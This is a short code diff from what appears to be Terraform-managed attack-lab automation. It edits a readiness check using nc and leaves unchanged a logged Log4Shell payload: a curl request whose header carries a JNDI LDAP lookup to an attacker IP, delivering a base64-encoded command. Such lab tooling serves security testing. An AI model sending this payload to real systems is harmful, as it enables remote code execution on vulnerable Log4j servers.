@@ -33,7 +33,7 @@ locals {
     docker ps -a >> $LOGFILE 2>&1
     log "payload: curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}'"
     log "checking target: ${local.target_ip}:${local.target_port}"
-    while ! nc -w 5 -vv ${local.target_ip} ${local.target_port} >> $LOGFILE 2>&1; do
+    while ! nc -z -w 5 -vv ${local.target_ip} ${local.target_port} > /dev/null; do
         log "failed check - waiting for target";
         sleep 30;
     done;
